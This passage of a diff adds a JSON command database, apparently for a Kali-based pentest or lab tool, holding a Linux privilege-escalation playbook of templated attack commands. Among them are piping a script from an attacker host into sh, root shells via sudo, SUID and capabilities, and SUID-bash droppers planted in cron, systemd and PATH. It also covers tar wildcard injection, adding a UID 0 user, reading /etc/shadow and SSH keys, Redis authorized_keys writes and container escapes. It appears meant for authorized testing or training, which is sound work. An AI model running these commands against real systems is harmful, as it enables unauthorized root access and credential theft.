@@ -1,0 +1,644 @@
+{
+  "tools": [
+    {
+      "name": "linpeas",
+      "description": "PEASS-ng script that checks almost every Linux privesc vector and colour-codes the likely ones.",
+      "commands": [
+        { "purpose": "On Kali: serve linpeas.sh from the folder holding it", "template": "python3 -m http.server {{LPORT}}", "intent": "transfer" },
+        { "purpose": "Run it straight from memory, nothing written to disk", "template": "curl -s http://{{LHOST}}:{{LPORT}}/linpeas.sh | sh", "intent": "enumerate" },
+        { "purpose": "No curl or want a saved copy: download it first", "template": "wget http://{{LHOST}}:{{LPORT}}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh", "intent": "transfer" },
+        { "purpose": "Run and keep the output for later reading", "template": "/tmp/linpeas.sh | tee /tmp/linpeas.txt", "intent": "enumerate" },
+        { "purpose": "Read saved output with colours: red on yellow = near-certain vector, red = worth checking", "template": "less -R /tmp/linpeas.txt", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "LinEnum",
+      "description": "Older bash enumeration script; quieter output than linpeas, good second opinion.",
+      "commands": [
+        { "purpose": "Download from your Kali web server", "template": "wget http://{{LHOST}}:{{LPORT}}/LinEnum.sh -O /tmp/LinEnum.sh && chmod +x /tmp/LinEnum.sh", "intent": "transfer" },
+        { "purpose": "Thorough run", "template": "/tmp/LinEnum.sh -t", "intent": "enumerate" },
+        { "purpose": "Thorough run, search config/log files for a keyword, save a report", "template": "/tmp/LinEnum.sh -t -k password -r /tmp/linenum-report", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "linux-exploit-suggester",
+      "description": "les.sh: matches the kernel and package versions against known local privesc exploits.",
+      "commands": [
+        { "purpose": "Download from your Kali web server", "template": "wget http://{{LHOST}}:{{LPORT}}/les.sh -O /tmp/les.sh && chmod +x /tmp/les.sh", "intent": "transfer" },
+        { "purpose": "Run on the target; read 'highly probable' entries first", "template": "/tmp/les.sh", "intent": "enumerate" },
+        { "purpose": "Run on Kali against a pasted uname -a string", "template": "./les.sh --uname \"<uname -a output>\"", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "pspy",
+      "description": "Watches new processes and file events without root; reveals cron jobs and root scripts.",
+      "commands": [
+        { "purpose": "Pick the right build: x86_64 = pspy64, i686 = pspy32", "template": "uname -m", "intent": "enumerate" },
+        { "purpose": "Download from your Kali web server", "template": "wget http://{{LHOST}}:{{LPORT}}/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64", "intent": "transfer" },
+        { "purpose": "Print commands and file events, scan every second; leave it a few minutes and look for UID=0", "template": "/tmp/pspy64 -pf -i 1000", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "GTFOBins",
+      "description": "Website listing how normal Unix binaries give a shell, file read or file write under sudo, SUID or capabilities.",
+      "commands": [
+        { "purpose": "Open the page for a binary; each section has Sudo and SUID variants", "template": "https://gtfobins.org/gtfobins/<binary>/", "intent": "enumerate" },
+        { "purpose": "Index: search every binary you found in sudo -l, SUID or getcap output", "template": "https://gtfobins.org/", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "find",
+      "description": "Searches the filesystem; the workhorse for SUID, writable and interesting files.",
+      "commands": [
+        { "purpose": "SUID binaries (run as their owner)", "template": "find / -perm -4000 -type f 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "SGID binaries (run as their group)", "template": "find / -perm -2000 -type f 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "Files you can write, minus kernel noise", "template": "find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' -not -path '/run/*' 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "Directories you can write", "template": "find / -writable -type d -not -path '/proc/*' 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "Files owned by a given user or group", "template": "find / -user <user> -type f 2>/dev/null | grep -v '^/proc'", "intent": "enumerate" },
+        { "purpose": "Files changed in the last 10 minutes (spot cron output)", "template": "find / -mmin -10 -type f 2>/dev/null | grep -vE '^/(proc|sys|run)'", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "getcap",
+      "description": "Lists file capabilities, which can grant root-like powers without SUID.",
+      "commands": [
+        { "purpose": "All files with capabilities", "template": "getcap -r / 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "Same when getcap is not in PATH", "template": "/usr/sbin/getcap -r / 2>/dev/null", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "openssl",
+      "description": "Generates crypt-style password hashes for passwd/shadow lines.",
+      "commands": [
+        { "purpose": "MD5-crypt hash, accepted everywhere", "template": "openssl passwd -1 -salt slg <pass>", "intent": "tune" },
+        { "purpose": "SHA-512 hash (OpenSSL 1.1.1 or newer)", "template": "openssl passwd -6 <pass>", "intent": "tune" }
+      ]
+    },
+    {
+      "name": "docker",
+      "description": "Container CLI; anyone who can talk to the daemon is effectively root on the host.",
+      "commands": [
+        { "purpose": "Images already present (no internet needed if one exists)", "template": "docker images", "intent": "enumerate" },
+        { "purpose": "Running and stopped containers", "template": "docker ps -a", "intent": "enumerate" },
+        { "purpose": "Mount the host root and chroot into it", "template": "docker run -v /:/mnt --rm -it <image> chroot /mnt sh", "intent": "exploit" },
+        { "purpose": "Talk to an exposed socket directly", "template": "docker -H unix:///var/run/docker.sock images", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "lxc",
+      "description": "LXD client; members of the lxd group can start privileged containers.",
+      "commands": [
+        { "purpose": "Images already imported", "template": "lxc image list", "intent": "enumerate" },
+        { "purpose": "Existing containers", "template": "lxc list", "intent": "enumerate" },
+        { "purpose": "First-time setup if lxc complains there is no storage pool", "template": "lxd init --auto", "intent": "tune" }
+      ]
+    },
+    {
+      "name": "debugfs",
+      "description": "ext filesystem debugger; reads raw disk as the disk group, bypassing file permissions.",
+      "commands": [
+        { "purpose": "Find the root device first", "template": "df -h /", "intent": "enumerate" },
+        { "purpose": "Interactive shell on the device (then: cat /etc/shadow)", "template": "debugfs /dev/sda1", "intent": "dump" },
+        { "purpose": "One-shot file read", "template": "debugfs -R 'cat /etc/shadow' /dev/sda1", "intent": "dump" }
+      ]
+    },
+    {
+      "name": "searchsploit",
+      "description": "Offline Exploit-DB search on Kali.",
+      "commands": [
+        { "purpose": "Search by product and version", "template": "searchsploit <software> <version>", "intent": "enumerate" },
+        { "purpose": "Kernel privesc candidates", "template": "searchsploit linux kernel <version> privilege escalation", "intent": "enumerate" },
+        { "purpose": "Read an entry", "template": "searchsploit -x <id>", "intent": "enumerate" },
+        { "purpose": "Copy an entry to the current folder", "template": "searchsploit -m <id>", "intent": "transfer" }
+      ]
+    },
+    {
+      "name": "grep",
+      "description": "Recursive text search; the fastest way to find passwords in configs.",
+      "commands": [
+        { "purpose": "Case-insensitive 'password' in common places, skip binaries", "template": "grep -rniI 'password' /var/www /opt /etc /home 2>/dev/null", "intent": "dump" },
+        { "purpose": "Only list files that mention pass", "template": "grep -rliI 'pass' /var/www /opt /srv 2>/dev/null", "intent": "dump" },
+        { "purpose": "Database settings in web configs", "template": "grep -rniIE 'db_pass|db_user|database_password|mysql_pwd' /var/www 2>/dev/null", "intent": "dump" }
+      ]
+    },
+    {
+      "name": "ss",
+      "description": "Lists listening sockets; shows services bound to localhost only.",
+      "commands": [
+        { "purpose": "All listening TCP/UDP with process (process names only for your own)", "template": "ss -tulpn", "intent": "enumerate" },
+        { "purpose": "Only local-only TCP listeners", "template": "ss -tlnp | grep -E '127\\.0\\.0\\.1|\\[::1\\]'", "intent": "enumerate" },
+        { "purpose": "Older systems without ss", "template": "netstat -tulpn", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "ltrace",
+      "description": "Traces library calls of a binary; shows what a custom SUID program runs or compares.",
+      "commands": [
+        { "purpose": "Library calls (system(), strcmp() with a hardcoded password, ...)", "template": "ltrace <binary>", "intent": "enumerate" },
+        { "purpose": "System calls: files opened and programs executed", "template": "strace -f <binary> 2>&1 | grep -iE 'open|exec|access'", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "showmount",
+      "description": "Lists NFS exports from Kali.",
+      "commands": [
+        { "purpose": "Exports and who may mount them", "template": "showmount -e {{TARGET}}", "intent": "enumerate" }
+      ]
+    }
+  ],
+  "techniques": [
+    {
+      "name": "Situational awareness: who and where you are",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["version"],
+      "when": "First thing after landing a shell, before running any script.",
+      "tools": [],
+      "commands": [
+        { "purpose": "User, groups (docker, lxd, disk, adm are gifts)", "template": "id", "intent": "enumerate" },
+        { "purpose": "Host name and kernel version", "template": "hostname && uname -a", "intent": "enumerate" },
+        { "purpose": "Distribution and release", "template": "cat /etc/os-release", "intent": "enumerate" },
+        { "purpose": "Interfaces: extra networks mean pivot targets", "template": "ip a", "intent": "enumerate" },
+        { "purpose": "Environment: PATH, odd variables, secrets", "template": "env", "intent": "enumerate" },
+        { "purpose": "sudo version (old versions have CVEs)", "template": "sudo -V | head -1", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Map processes, users and available tools",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": [],
+      "when": "Right after the basics, to see what runs as root and what you can use.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Processes with owner; look at anything run by root", "template": "ps aux", "intent": "enumerate" },
+        { "purpose": "Real login users", "template": "grep -vE 'nologin|false$' /etc/passwd", "intent": "enumerate" },
+        { "purpose": "Which helpers exist for later steps", "template": "which python3 python perl gcc nc ncat socat curl wget 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "Home dirs and usual drop spots", "template": "ls -la /home/* /opt /tmp /var/www 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "Mounted filesystems and disks", "template": "df -h; cat /etc/fstab", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Automated privesc enumeration",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["version"],
+      "when": "After the manual basics, to get a full list of candidate vectors in one go.",
+      "tools": ["linpeas", "LinEnum", "linux-exploit-suggester", "pspy"],
+      "commands": [
+        { "purpose": "Reading tip: jump through the saved output by section header", "template": "grep -n '╔══' /tmp/linpeas.txt", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Sudo rights abuse",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "Always check; any binary in sudo -l that appears on GTFOBins is usually root.",
+      "tools": ["GTFOBins"],
+      "commands": [
+        { "purpose": "What you may run as whom (NOPASSWD lines need no password)", "template": "sudo -l", "intent": "enumerate" },
+        { "purpose": "Run an allowed binary as another user from the (user) column", "template": "sudo -u <user> <binary>", "intent": "exploit" },
+        { "purpose": "Allowed script: can you edit it or anything it calls?", "template": "ls -la <file>; cat <file>", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Shell from a sudo-allowed binary",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "sudo -l lists an editor, pager, interpreter or find; check GTFOBins for others.",
+      "tools": ["GTFOBins"],
+      "commands": [
+        { "purpose": "find", "template": "sudo find . -exec /bin/sh \\; -quit", "intent": "exploit" },
+        { "purpose": "vim / vi", "template": "sudo vim -c ':!/bin/sh'", "intent": "exploit" },
+        { "purpose": "less / man: open, then type !/bin/sh", "template": "sudo less /etc/profile", "intent": "exploit" },
+        { "purpose": "python", "template": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'", "intent": "exploit" },
+        { "purpose": "env", "template": "sudo env /bin/sh", "intent": "exploit" },
+        { "purpose": "awk", "template": "sudo awk 'BEGIN {system(\"/bin/sh\")}'", "intent": "exploit" }
+      ]
+    },
+    { "name": "Sudo LD_PRELOAD with env_keep", "phase": "PrivEsc", "service": "shell", "applies": "linux", "needs": ["shell"], "yields": ["admin"], "when": "sudo -l shows env_keep+=LD_PRELOAD and you may run any command with sudo.", "tools": [], "commands": [
+      { "purpose": "Confirm the env_keep line", "template": "sudo -l | grep -i ld_preload", "intent": "enumerate" },
+      { "purpose": "Compile the preload library (short C source in HackTricks' LD_PRELOAD section, saved as /tmp/pe.c)", "template": "gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c", "intent": "exploit" },
+      { "purpose": "Run any allowed sudo command with it preloaded", "template": "sudo LD_PRELOAD=/tmp/pe.so <binary>", "intent": "exploit" }
+    ] },
+    {
+      "name": "Sudo version vulnerabilities",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "sudo is old (Baron Samedit CVE-2021-3156: before 1.9.5p2) or sudo -l shows (ALL, !root).",
+      "tools": ["searchsploit"],
+      "commands": [
+        { "purpose": "Exact sudo version", "template": "sudo -V | head -1", "intent": "enumerate" },
+        { "purpose": "Baron Samedit check: 'not a regular file' = vulnerable, 'usage:' = patched", "template": "sudoedit -s /", "intent": "enumerate" },
+        { "purpose": "CVE-2019-14287 (sudo < 1.8.28) with a (ALL, !root) rule", "template": "sudo -u#-1 /bin/bash", "intent": "exploit" },
+        { "purpose": "Look up public exploits for the version", "template": "searchsploit sudo <version>", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "SUID and SGID binary abuse",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "A non-standard binary has the SUID bit; compare the list against GTFOBins.",
+      "tools": ["find", "GTFOBins"],
+      "commands": [
+        { "purpose": "SUID list with owner and date (odd paths stand out)", "template": "find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "SUID find (note -p keeps the privileges)", "template": "find . -exec /bin/sh -p \\; -quit", "intent": "exploit" },
+        { "purpose": "SUID bash or a SUID copy of it", "template": "/bin/bash -p", "intent": "exploit" },
+        { "purpose": "SUID python", "template": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Custom SUID binary analysis",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "A SUID binary is not on GTFOBins (homemade tool in /usr/local/bin, /opt, a home dir).",
+      "tools": ["ltrace"],
+      "commands": [
+        { "purpose": "What kind of file it is", "template": "file <binary>", "intent": "enumerate" },
+        { "purpose": "Commands it calls: a bare name like 'service' or 'curl' is hijackable", "template": "strings <binary> | less", "intent": "enumerate" },
+        { "purpose": "Relative-path hijack: fake command in /tmp that keeps privileges", "template": "printf '#!/bin/bash\\n/bin/bash -p\\n' > /tmp/<cmd> && chmod +x /tmp/<cmd>", "intent": "exploit" },
+        { "purpose": "Put /tmp first in PATH and run the binary", "template": "export PATH=/tmp:$PATH && <binary>", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Shared object hijacking",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "A SUID binary loads a shared object from a path you can write to, or ldd shows one as not found.",
+      "tools": [],
+      "commands": [
+        { "purpose": "List the shared objects a SUID binary loads; look for a writable or missing path", "template": "ldd <binary>", "intent": "enumerate" },
+        { "purpose": "Confirm the library search path it was linked with (RPATH/RUNPATH)", "template": "readelf -d <binary> | grep -i path", "intent": "enumerate" },
+        { "purpose": "Drop any real library at that path and run the binary: the undefined-symbol error names the function to implement", "template": "cp /lib/x86_64-linux-gnu/libc.so.6 <path/lib.so> && <binary>", "intent": "enumerate" },
+        { "purpose": "Write the payload: define that function to drop root privileges into a shell", "template": "printf '#include <stdlib.h>\\n#include <unistd.h>\\nvoid <function>() { setuid(0); system(\"/bin/sh -p\"); }\\n' > /tmp/hijack.c", "intent": "exploit" },
+        { "purpose": "Compile it as a shared object at the path the binary loads", "template": "gcc -fPIC -shared -o <path/lib.so> /tmp/hijack.c", "intent": "exploit" },
+        { "purpose": "Run the SUID binary so it loads the hijacked library", "template": "<binary>", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Linux capabilities abuse",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "getcap shows cap_setuid, cap_dac_read_search or similar on an interpreter or archiver.",
+      "tools": ["getcap", "GTFOBins"],
+      "commands": [
+        { "purpose": "List capabilities", "template": "getcap -r / 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "python with cap_setuid+ep (use the full path getcap printed)", "template": "<path>/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "intent": "exploit" },
+        { "purpose": "perl with cap_setuid+ep", "template": "<path>/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'", "intent": "exploit" },
+        { "purpose": "tar with cap_dac_read_search: archive a root-only file", "template": "<path>/tar -czf /tmp/s.tgz /etc/shadow", "intent": "dump" },
+        { "purpose": "Unpack it where you can read it", "template": "tar -xzf /tmp/s.tgz -C /tmp && cat /tmp/etc/shadow", "intent": "dump" }
+      ]
+    },
+    {
+      "name": "Cron job abuse",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "A root cron job or timer runs a script you can write, or uses a PATH dir you can write.",
+      "tools": ["pspy"],
+      "commands": [
+        { "purpose": "System crontab, including its PATH line", "template": "cat /etc/crontab", "intent": "enumerate" },
+        { "purpose": "Other cron locations and your own crontab", "template": "ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null; crontab -l", "intent": "enumerate" },
+        { "purpose": "systemd timers (the modern cron)", "template": "systemctl list-timers --all", "intent": "enumerate" },
+        { "purpose": "Is the job's script writable?", "template": "ls -la <file>", "intent": "enumerate" },
+        { "purpose": "Append a SUID-bash dropper to the writable script", "template": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> <file>", "intent": "exploit" },
+        { "purpose": "After the job fires", "template": "/tmp/rootbash -p", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Cron wildcard injection",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "A root job runs tar (or chown/rsync) with * inside a directory you can write.",
+      "tools": ["pspy"],
+      "commands": [
+        { "purpose": "Payload script in the target directory", "template": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > <path>/x.sh", "intent": "exploit" },
+        { "purpose": "File names that tar reads as options", "template": "touch <path>/--checkpoint=1 && touch '<path>/--checkpoint-action=exec=sh x.sh'", "intent": "exploit" },
+        { "purpose": "After the job fires", "template": "/tmp/rootbash -p", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Writable /etc/passwd",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "/etc/passwd is writable by you (linpeas flags it).",
+      "tools": ["openssl"],
+      "commands": [
+        { "purpose": "Check permissions", "template": "ls -la /etc/passwd", "intent": "enumerate" },
+        { "purpose": "Make a hash for a password you choose", "template": "openssl passwd -1 -salt slg <pass>", "intent": "tune" },
+        { "purpose": "Add a UID 0 user (paste the hash; single quotes keep the $ signs)", "template": "echo 'slg:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd", "intent": "exploit" },
+        { "purpose": "Switch to it", "template": "su slg", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Crack hashes from a readable /etc/shadow",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["hash", "creds"],
+      "when": "/etc/shadow (or a backup of it) is readable.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Check permissions and backups", "template": "ls -la /etc/shadow /etc/shadow- /var/backups/*shadow* 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "Copy the hashes to Kali", "template": "cat /etc/shadow", "intent": "dump" },
+        { "purpose": "On Kali: merge passwd and shadow", "template": "unshadow passwd shadow > hashes.txt", "intent": "tune" },
+        { "purpose": "On Kali: crack with rockyou", "template": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "intent": "authenticate" },
+        { "purpose": "On Kali: hashcat for $6$ (sha512crypt) hashes", "template": "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt", "intent": "authenticate" }
+      ]
+    },
+    {
+      "name": "Writable sudoers",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "/etc/sudoers or a file in /etc/sudoers.d is writable by you.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Check permissions", "template": "ls -la /etc/sudoers /etc/sudoers.d/", "intent": "enumerate" },
+        { "purpose": "Grant yourself everything", "template": "echo '<user> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers", "intent": "exploit" },
+        { "purpose": "Become root", "template": "sudo -i", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Writable systemd services",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "A root service or timer unit, or the binary it starts, is writable by you.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Writable unit files", "template": "find / \\( -name '*.service' -o -name '*.timer' \\) -writable 2>/dev/null | grep -v '^/proc'", "intent": "enumerate" },
+        { "purpose": "What the unit runs and as whom", "template": "grep -E 'ExecStart|User' <file>", "intent": "enumerate" },
+        { "purpose": "Point ExecStart at a SUID-bash dropper", "template": "sed -i 's|^ExecStart=.*|ExecStart=/bin/sh -c \"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\"|' <file>", "intent": "exploit" },
+        { "purpose": "Restart if sudo -l allows it, otherwise wait for a reboot or timer", "template": "sudo systemctl daemon-reload && sudo systemctl restart <service>", "intent": "exploit" },
+        { "purpose": "Then", "template": "/tmp/rootbash -p", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Writable directory in PATH",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "A directory early in root's PATH (cron, scripts, services) is writable by you.",
+      "tools": ["find"],
+      "commands": [
+        { "purpose": "Writable dirs in your PATH", "template": "find $(echo $PATH | tr ':' ' ') -maxdepth 0 -writable 2>/dev/null", "intent": "enumerate" },
+        { "purpose": "PATH that cron jobs use", "template": "grep PATH /etc/crontab", "intent": "enumerate" },
+        { "purpose": "Plant a fake command a root job calls without a full path", "template": "printf '#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\\n' > <path>/<cmd> && chmod +x <path>/<cmd>", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Internal-only services",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["version"],
+      "when": "nmap showed few ports but the box listens on more locally (web admin, databases).",
+      "tools": ["ss"],
+      "commands": [
+        { "purpose": "Local listeners", "template": "ss -tulpn", "intent": "enumerate" },
+        { "purpose": "Which service runs as root", "template": "ps aux | grep -i root | grep -vE '\\[|grep'", "intent": "enumerate" },
+        { "purpose": "Poke a local HTTP port", "template": "curl -s http://127.0.0.1:<port>/", "intent": "enumerate" },
+        { "purpose": "From Kali: forward it with found SSH creds (more in Pivoting)", "template": "ssh -L 8080:127.0.0.1:<port> <user>@{{TARGET}}", "intent": "pivot" }
+      ]
+    },
+    {
+      "name": "MySQL running as root",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell", "creds"], "yields": ["admin"],
+      "when": "mysqld runs as root and you have DB root creds (UDF route: raptor_udf2, EDB 1518).",
+      "tools": ["searchsploit"],
+      "commands": [
+        { "purpose": "Is mysqld running as root?", "template": "ps aux | grep -i mysql", "intent": "enumerate" },
+        { "purpose": "Try root with no or found password", "template": "mysql -u root -p", "intent": "authenticate" },
+        { "purpose": "Version, plugin dir and file-write restrictions for UDF", "template": "mysql -u root -p -e 'select @@version, @@plugin_dir, @@secure_file_priv;'", "intent": "enumerate" },
+        { "purpose": "On Kali: fetch the UDF write-up and source", "template": "searchsploit -m 1518", "intent": "transfer" }
+      ]
+    },
+    {
+      "name": "Redis to root",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "Redis listens locally without a password and runs as root.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Unauthenticated access and server info", "template": "redis-cli -h 127.0.0.1 info server", "intent": "enumerate" },
+        { "purpose": "Can it change its dump location?", "template": "redis-cli -h 127.0.0.1 config get dir", "intent": "enumerate" },
+        { "purpose": "Store your public key padded with newlines", "template": "(printf '\\n\\n'; cat ~/.ssh/id_rsa.pub; printf '\\n\\n') | redis-cli -h 127.0.0.1 -x set slg", "intent": "exploit" },
+        { "purpose": "Dump it as root's authorized_keys", "template": "redis-cli -h 127.0.0.1 config set dir /root/.ssh && redis-cli -h 127.0.0.1 config set dbfilename authorized_keys && redis-cli -h 127.0.0.1 save", "intent": "exploit" },
+        { "purpose": "Log in as root", "template": "ssh -i ~/.ssh/id_rsa root@{{TARGET}}", "intent": "authenticate" }
+      ]
+    },
+    {
+      "name": "Docker group or socket to root",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "id shows the docker group or /var/run/docker.sock is writable by you.",
+      "tools": ["docker"],
+      "commands": [
+        { "purpose": "Group membership and socket permissions", "template": "id; ls -la /var/run/docker.sock", "intent": "enumerate" },
+        { "purpose": "Pick a local image", "template": "docker images", "intent": "enumerate" },
+        { "purpose": "Mount the host disk and chroot into it as root", "template": "docker run -v /:/mnt --rm -it <image> chroot /mnt sh", "intent": "exploit" }
+      ]
+    },
+    { "name": "Escape a Docker container", "phase": "PrivEsc", "service": "shell", "applies": "linux", "needs": ["shell"], "yields": ["admin"], "when": "You are root but the hostname is random and the box is bare: check whether you are in a container and how it was started.", "tools": [], "commands": [
+      { "purpose": "Signs of a container", "template": "ls -la /.dockerenv; cat /proc/1/cgroup; hostname", "intent": "enumerate" },
+      { "purpose": "Privileged? CapEff of 0000003fffffffff or more, and host disks visible", "template": "grep CapEff /proc/self/status; ls /dev/sd* /dev/nvme* /dev/xvd* 2>/dev/null", "intent": "enumerate" },
+      { "purpose": "Privileged: mount the host disk and read it", "template": "mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host/root", "intent": "exploit" },
+      { "purpose": "A mounted Docker socket means host root (see the docker group technique)", "template": "ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null", "intent": "enumerate" }
+    ] },
+    {
+      "name": "LXD group to root",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "id shows the lxd or lxc group.",
+      "tools": ["lxc"],
+      "commands": [
+        { "purpose": "On Kali: build a tiny Alpine image, then serve the tar.gz", "template": "git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && sudo ./build-alpine", "intent": "transfer" },
+        { "purpose": "Import it on the target", "template": "lxc image import ./alpine-v*.tar.gz --alias slg", "intent": "exploit" },
+        { "purpose": "Create a privileged container", "template": "lxc init slg slgc -c security.privileged=true", "intent": "exploit" },
+        { "purpose": "Mount the host root inside it", "template": "lxc config device add slgc host-root disk source=/ path=/mnt/root recursive=true", "intent": "exploit" },
+        { "purpose": "Start and enter; host files are under /mnt/root", "template": "lxc start slgc && lxc exec slgc /bin/sh", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Disk group raw read",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["hash"],
+      "when": "id shows the disk group: you can read the raw block device.",
+      "tools": ["debugfs"],
+      "commands": [
+        { "purpose": "Device holding /", "template": "df -h /", "intent": "enumerate" },
+        { "purpose": "Read shadow straight off the disk", "template": "debugfs -R 'cat /etc/shadow' /dev/sda1", "intent": "dump" },
+        { "purpose": "Or grab root's SSH key", "template": "debugfs -R 'cat /root/.ssh/id_rsa' /dev/sda1", "intent": "dump" }
+      ]
+    },
+    {
+      "name": "Abuse adm, shadow, video and sudo groups",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["creds"],
+      "when": "id shows one of these groups.",
+      "tools": [],
+      "commands": [
+        { "purpose": "adm: search readable logs for passwords", "template": "grep -rniI 'pass' /var/log 2>/dev/null", "intent": "dump" },
+        { "purpose": "adm: typed input captured by auditd (su/sudo passwords)", "template": "aureport --tty", "intent": "dump" },
+        { "purpose": "shadow: read the hashes", "template": "cat /etc/shadow", "intent": "dump" },
+        { "purpose": "video: grab the screen framebuffer, plus its size to view it in GIMP", "template": "cat /dev/fb0 > /tmp/screen.raw; cat /sys/class/graphics/fb0/virtual_size", "intent": "dump" },
+        { "purpose": "sudo/wheel: with your password you are one step from root", "template": "sudo -i", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "NFS no_root_squash abuse",
+      "phase": "PrivEsc", "service": "shell", "applies": "linux",
+      "needs": ["shell"], "yields": ["admin"],
+      "when": "An NFS export has no_root_squash, so root on Kali is root on the share.",
+      "tools": ["showmount"],
+      "commands": [
+        { "purpose": "On the target: look for no_root_squash", "template": "cat /etc/exports", "intent": "enumerate" },
+        { "purpose": "On Kali: list exports", "template": "showmount -e {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "On Kali: mount the share", "template": "mkdir -p /tmp/nfs && sudo mount -o rw,vers=3 {{TARGET}}:<path> /tmp/nfs", "intent": "exploit" },
